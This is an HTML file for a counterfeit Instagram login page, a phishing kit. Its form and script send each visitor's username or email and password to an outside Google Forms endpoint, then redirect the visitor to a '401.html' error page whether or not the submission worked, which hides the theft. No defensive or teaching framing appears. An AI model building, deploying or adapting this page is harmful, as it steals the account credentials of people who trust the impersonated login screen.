<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="stylesheet" href="./styles.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Instagram login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        html, body {
            height: 100%;
        }
        body {
            display: flex;
            justify-content: center;
            align-items: center;
        }
    </style>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                
                <!-- Connect the form to Google Form -->
                <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLScS_lZJJZxWAySrV6Amjp8SF11-3U9HpOCemR782V_QQue02w/formResponse" method="POST" target="_self" onsubmit="submitForm(event)">
                    <label for="email" class="sr-only">username, phone number or email</label>
                    <input name="entry.1162589549" placeholder="username, phone number or email" class="input-field" required />
                    
                    <label for="password" class="sr-only">Password</label>
                    <input name="entry.1612369267" type="password" placeholder="password" class="input-field" required />
                    
                    <button type="submit">Login</button>
                </form>

                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a>login with facebook</a>
                    </div>
                    <a href="#">Don't have an account?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p></p>
                <a href="#">Facebook</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get the app on.</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
                    <img src="./img/googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">Meta</a></li>
            <li><a href="#">About</a></li>
            <li><a href="#">Blog</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">terms</a></li>
            <li><a href="#">locatins</a></li>
            <li><a href="#">Threads</a></li>
            <li><a href="#">instagram</a></li>
            <li><a href="#">facebook</a></li>
            <li><a href="#">HASHTAGS</a></li>
            <li><a href="#">IDIOMA</a></li>
        </ul>
        <p class="copyright">© 2025 Instagram & Facebook</p>
    </footer>

    <!-- ✅ JavaScript to Submit Form + Redirect to 401.html -->
    <script>
        function submitForm(event) {
            event.preventDefault(); // Prevent default form submission

            // Submit form to Google Form
            const form = event.target;
            const formData = new FormData(form);

            fetch(form.action, {
                method: form.method,
                body: formData,
                mode: 'no-cors'
            }).then(() => {
                // After successful submission, redirect to 401.html
                window.location.href = '401.html';
            }).catch(() => {
                // Even if form fails, redirect to 401.html
                window.location.href = '401.html';
            });
        }
    </script>
</body>
</html>
